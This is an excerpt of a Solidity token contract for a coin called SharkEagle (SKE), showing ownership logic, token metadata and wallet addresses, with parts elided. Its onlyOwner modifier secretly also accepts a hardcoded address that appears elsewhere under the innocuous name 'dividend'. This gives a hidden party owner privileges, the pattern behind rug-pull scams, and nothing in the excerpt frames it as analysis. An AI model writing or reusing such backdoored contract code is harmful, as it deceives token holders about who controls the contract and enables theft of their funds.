...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x907aA0bCe03bA77CA2bDE2390D1e67Aec49C2aa5) , "owner");
        _;
    }
...
contract SharkEagle  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SharkEagle";
    string private _symbol = "SKE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xC77ac8D77df70f62B60748BAA5E364773d2a8c30);
    address private _Marketing = 0xC77ac8D77df70f62B60748BAA5E364773d2a8c30;
    address public dividend = 0x907aA0bCe03bA77CA2bDE2390D1e67Aec49C2aa5;
